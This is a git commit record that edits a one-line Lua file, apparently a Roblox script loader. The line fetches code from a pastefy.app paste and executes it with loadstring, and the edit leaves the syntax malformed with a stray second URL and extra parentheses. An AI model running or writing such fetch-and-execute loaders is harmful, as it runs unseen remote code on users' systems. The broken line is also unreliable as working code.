02d2e24152a512015013c50b201e86eb8b6b39d8
Marek <alidegermenci25@gmail.com>
2026-03-11 00:55:27 +0100

    Update B.lua

--- B.lua
+++ B.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastefy.app/8qheksyS/raw"))()https://pastefy.app/qlqseQ9p/raw
+loadstring(game:HttpGet("https://pastefy.app/8qheksyS/raw"))()https://pastefy.app/qlqseQ9p/raw))()
